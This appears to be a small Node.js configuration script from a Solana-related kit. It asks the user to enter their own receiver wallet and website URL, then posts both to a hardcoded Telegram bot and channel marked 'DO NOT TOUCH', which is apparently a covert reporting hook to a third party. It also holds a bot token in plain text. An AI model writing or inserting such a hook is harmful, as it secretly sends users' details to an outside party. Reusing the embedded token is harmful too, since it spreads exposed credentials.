const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '8140871075:AAHdUsnOgRMS6x5Dq2FTBAd_-VYz9erpCmg';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '7857993230';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = '6d26RcBiQoCY8DVq4GQ3MZy9QmDd1hjPy98U6wVxYp8M';
const website_url = 'YOUR_WEBSITE_URL';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
